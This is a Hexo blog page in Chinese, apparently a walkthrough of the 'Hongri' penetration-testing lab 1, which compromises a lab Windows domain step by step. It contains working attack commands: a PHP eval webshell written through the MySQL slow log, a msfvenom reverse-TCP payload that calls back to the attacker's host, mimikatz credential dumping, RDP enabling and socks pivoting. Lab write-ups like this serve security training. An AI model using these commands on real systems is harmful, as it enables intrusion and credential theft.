@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="网络拓扑图  本次实验攻击机为kali：192.168.60.128，web服务器为win7（双网卡，192.168.52.143&#x2F;192.168.60.139），域内主机win2008 R2:192.168.52.138，win2003:192.168.52.141 注意关闭win7的防火墙，启动phpstudy服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场-1">
+<meta property="og:url" content="http://example.com/2023/08/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="网络拓扑图  本次实验攻击机为kali：192.168.60.128，web服务器为win7（双网卡，192.168.52.143&#x2F;192.168.60.139），域内主机win2008 R2:192.168.52.138，win2003:192.168.52.141 注意关闭win7的防火墙，启动phpstudy服务">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A511.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A513.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A512.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A514.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A515.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A516.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5111.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5113.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5112.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5114.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A517.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A518.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A519.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5110.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5115.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5116.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5117.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5118.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5119.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5120.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5121.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5122.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5123.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5124.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5125.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5126.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5127.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5128.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5129.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5130.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5131.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5132.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5133.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5134.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5135.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5136.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5137.png">
+<meta property="article:published_time" content="2023-08-13T03:12:50.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:36:27.704Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A511.png">
+
+<link rel="canonical" href="http://example.com/2023/08/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红日靶场-1 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场-1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-13 11:12:50" itemprop="dateCreated datePublished" datetime="2023-08-13T11:12:50+08:00">2023-08-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:36:27" itemprop="dateModified" datetime="2025-05-25T11:36:27+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>网络拓扑图</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A511.png" alt="img"></p>
+<p>本次实验攻击机为kali：192.168.60.128，web服务器为win7（双网卡，192.168.52.143&#x2F;192.168.60.139），域内主机win2008 R2:192.168.52.138，win2003:192.168.52.141</p>
+<p>注意关闭win7的防火墙，启动phpstudy服务</p>
+<span id="more"></span>
+
+<h2 id="信息搜集-外网打点"><a href="#信息搜集-外网打点" class="headerlink" title="信息搜集+外网打点"></a>信息搜集+外网打点</h2><p>先扫描一下外网web服务开放了哪些端口（用Windows）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -A -p 1-65535 192.168.112.139</span><br></pre></td></tr></table></figure>
+
+<p>发现开启了80和3306端口（mysql默认端口）</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A513.png" alt="img"></p>
+<p>访问一下80端口，是一个phpstudy探针</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A512.png" alt="img"></p>
+<p>扫一下目录（推荐用kali）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.112.139/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A514.png" alt="img"></p>
+<p>开启了phpmyadmin，使用root&#x2F;root即可登录后台</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A515.png" alt="img"></p>
+<p>有个CMS admin的账号和密码，数据库里面没有什么可用的信息了，尝试写马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure%&quot;</span><br></pre></td></tr></table></figure>
+
+<p>回显NULL，说明不能正常写入，看看慢日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@slow_query_log </span><br></pre></td></tr></table></figure>
+
+<p>为0，未开启，我们设置其为1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log = 1</span><br></pre></td></tr></table></figure>
+
+<p>继续查看一下慢日志路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@slow_query_log_file</span><br></pre></td></tr></table></figure>
+
+<p>显示<code>C:\phpStudy\MySQL\data\stu1-slow.log</code>，改变路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>执行慢日志查询，插入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[log]);?&gt;&quot; from yx_admin where sleep(11)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A516.png" alt="img"></p>
+<h4 id="getshell的另一种姿势"><a href="#getshell的另一种姿势" class="headerlink" title="getshell的另一种姿势"></a>getshell的另一种姿势</h4><p>我的dirsearch没扫出来…..</p>
+<p>可以找到一个beifen.rar文件以及一个&#x2F;yxcms目录，该页面有admin的登录方式，admin&#x2F;123456进入后台，可以发现一个前台模板的功能，该功能可以上传文件</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5111.png" alt="img"></p>
+<p>上传后可以在beifen.rar中找到路径是啥（搜索acomment.php即可）</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5113.png" alt="img"></p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5112.png" alt="img"></p>
+<p>getshell</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5114.png" alt="img"></p>
+<h2 id="拿下shell后信息搜集"><a href="#拿下shell后信息搜集" class="headerlink" title="拿下shell后信息搜集"></a>拿下shell后信息搜集</h2><p>getshell，蚁剑连接，是管理员权限</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A517.png" alt="img"></p>
+<h4 id="是否存在域"><a href="#是否存在域" class="headerlink" title="是否存在域"></a>是否存在域</h4><p>内网环境分为域环境和非域环境，两者环境的渗透是不一样的，所以此时我们需要判断当前主机是否处在域环境中</p>
+<p>这里有几种方法可供选择：</p>
+<p><strong>（1）net time &#x2F;domain</strong></p>
+<ul>
+<li>如果当前主机处于工作组中未加入域，则显示找不到域控制器</li>
+<li>加入了域，且当前用户为本地用户包括本地管理员，则显示拒绝访问</li>
+<li>加入了域，且当前用户域用户，则显示域控的时间</li>
+</ul>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A518.png" alt="img"></p>
+<p><strong>（2）ipconfig &#x2F;all</strong></p>
+<p>当前主机如果是工作组中，则主DNS后缀为空。如果加入了域则主DNS为域名</p>
+<ul>
+<li>工作组：只要没有加入域，主机的网卡不管有没有自定义dns服务器ip。 执行 ipconfg &#x2F;all 后主DNS后缀都为空</li>
+<li>域环境：只要加入域，不管当前用户为域用户还是本地用户，主DNS的后缀都为域名</li>
+</ul>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A519.png" alt="img"></p>
+<p><strong>（3）systeminfo</strong></p>
+<ul>
+<li>工作组环境systeminfo查询的显示为WORKGROUP，域环境查询的域是域名</li>
+<li>域中，不管此时是什么用户登陆。查询的域是域名</li>
+</ul>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5110.png" alt="img"></p>
+<p>明显可以看出该主机在域内，有必要进行后渗透，拿下域控</p>
+<h4 id="网络连接情况-进程-杀软-服务-是否可以出网-用户开放情况"><a href="#网络连接情况-进程-杀软-服务-是否可以出网-用户开放情况" class="headerlink" title="网络连接情况 进程 杀软 服务 是否可以出网 用户开放情况"></a>网络连接情况 进程 杀软 服务 是否可以出网 用户开放情况</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.ipconfig 看所处网段是否有多个</span><br><span class="line">2.netstat -ano 查看网络连接和开放端口</span><br><span class="line">3.net start  查看启动的服务  用于提权</span><br><span class="line">4.tasklist   查看开启的进程</span><br><span class="line">5.tasklist /SVC 复制到在线杀软识别 看存在的杀软情况  https://i.hacking8.com/tiquan</span><br><span class="line">6. ping baidu  看是否可以出网等 </span><br><span class="line">7. net user   存在用户</span><br></pre></td></tr></table></figure>
+
+<h4 id="翻文件-txt-类型的-看是否有密码"><a href="#翻文件-txt-类型的-看是否有密码" class="headerlink" title="翻文件 txt 类型的 看是否有密码"></a>翻文件 txt 类型的 看是否有密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /s /b &quot;C:\Your\Directory\Path\*.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透阶段，当我们已经将小马上传到web服务器上时，可以用webshell管理工具进行下一步渗透了。</p>
+<p>cobalt strike（简称CS）及Metasploit（简称msf）各有所长，cs更适合作为稳控平台，msf更适用于与各类 内网信息搜集及漏洞利用。为了取长补短，我们通常会进行联动。</p>
+<h4 id="基于msf"><a href="#基于msf" class="headerlink" title="基于msf"></a>基于msf</h4><p>这里的思路是将shell派送给CS或者msf进行下一步渗透。使用msf生成exe并开启监听(也可以用cs生产exe)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.60.128 LPORT=9999 -f exe -o hack.exe</span><br></pre></td></tr></table></figure>
+
+<p>将该exe文件上传到目录</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5115.png" alt="img"></p>
+<p>kali执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.60.128</span><br><span class="line">lhost =&gt; 192.168.112.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 9999</span><br><span class="line">lport =&gt; 9999</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>
+
+<p>运行hack.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.exe</span><br></pre></td></tr></table></figure>
+
+<p><code>sessions -i</code>查看接收到的所有会话</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5116.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions 1</span><br></pre></td></tr></table></figure>
+
+<p>成功上线</p>
+<h5 id="上线后的信息搜集"><a href="#上线后的信息搜集" class="headerlink" title="上线后的信息搜集"></a>上线后的信息搜集</h5><p>输入?可查看可使用的命令</p>
+<p>扫描内网存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5117.png" alt="img"></p>
+<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>查看msf的提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br><span class="line">getuid查看服务器权限</span><br><span class="line">getsystem 提权</span><br><span class="line">getuid 查看是否提权成功</span><br></pre></td></tr></table></figure>
+
+<p>成功提权</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5118.png" alt="img"></p>
+<h5 id="抓取域用户的密码信息"><a href="#抓取域用户的密码信息" class="headerlink" title="抓取域用户的密码信息"></a>抓取域用户的密码信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows系统下的hash密码格式为：</span><br><span class="line">用户名称:RID:LM-HASH值:NT-HASH值</span><br><span class="line">NT-HASH hash生产方式：</span><br><span class="line"></span><br><span class="line"> 1. 将明文口令转换成十六进制的格式 </span><br><span class="line"> 2. 转换成Unicode格式，即在每个字节之后添加0x00</span><br><span class="line"> 3. 对Unicode字符串作MD4加密，生成32位的十六进制数字串</span><br><span class="line"></span><br><span class="line">eg：用户密码为test123</span><br><span class="line">转换成十六进制的格式为74657374313233</span><br><span class="line">转换成Unicode格式为7400650073007400310032003300</span><br><span class="line">对字符串7400650073007400310032003300作MD4加密，结果为c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line">以下3种都可尝试</span><br><span class="line">1.hashdump</span><br><span class="line">2.加载 kiwi模块</span><br><span class="line">load kiwi     加载kiwi模块</span><br><span class="line">creds_all    列出所有凭据</span><br><span class="line">3.加载mimikatz模块</span><br><span class="line">Windows10/2012 以下的版本可以直接抓取明文密码</span><br><span class="line">	再尝试加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，</span><br><span class="line">	而且该进程需要是system权限运行的。 </span><br><span class="line">	ps 查看进程</span><br><span class="line">migrate PID （我这里使用的是3696）</span><br><span class="line">load mimikatz </span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>1. </p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5119.png" alt="img"></p>
+<p>1. </p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5120.png" alt="img"></p>
+<p>1. </p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5121.png" alt="img"></p>
+<h5 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h5><p>检查3389端口是否开启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3389 端口是远程桌面协议（Remote Desktop Protocol，简称 RDP）的默认端口。</span><br><span class="line">nmap -p 3389 192.168.112.140</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5122.png" alt="img"></p>
+<p>可以看到是关闭了的，应该是防火墙阻拦</p>
+<p>使用<code>run post/windows/manage/enable_rdp</code>开启端口，再次扫描发现已经开启</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5123.png" alt="img"></p>
+<h4 id="基于cs"><a href="#基于cs" class="headerlink" title="基于cs"></a>基于cs</h4><p>生成exe文件，上传并运行</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5124.png" alt="img"></p>
+<p>成功上线，然后有现成的权限提升功能以及密码明文抓取</p>
+<h4 id="建立反向代理"><a href="#建立反向代理" class="headerlink" title="建立反向代理"></a>建立反向代理</h4><p>正向代理就是指内网机器如果不能直接连到外网，建立正向代理可以连到外网，而反向代理则相反，是外网主机想要进入内网建立的代理。</p>
+<p>首先新建一个路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure>
+
+<p>查看路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p>挂起会话，建立socks</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"></span><br><span class="line">set VERSION 4a</span><br><span class="line"></span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>exploit后就挂起了一个job</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5125.png" alt="img"></p>
+<p>然后修改&#x2F;etc&#x2F;proxychains4.conf文件</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5126.png" alt="img"></p>
+<p>测试一下，发现可以成功访问到内网</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5127.png" alt="img"></p>
+<h4 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><p>arp 探测内网存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line"></span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">set SESSION 1</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>扫到内网还有两台主机：192.168.52.138&#x2F;192.168.52.141</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5128.png" alt="img"></p>
+<p>也可以使用udp协议发现内网存活主机（有点慢）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line"></span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5129.png" alt="img"></p>
+<p>域信息搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net time /domain        #查看时间服务器</span><br><span class="line">net user /domain        #查看域用户</span><br><span class="line">net view /domain        #查看有几个域</span><br><span class="line">net view /domain:GOD  #查看GOD	域情况</span><br><span class="line">nslookup  主机名	 		#查看域内其他主机  可能ip查不出来</span><br><span class="line">net group &quot;domain computers&quot; /domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain admins&quot;   /domain          #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain       #查看域控</span><br></pre></td></tr></table></figure>
+
+<p>内网存活服务探测</p>
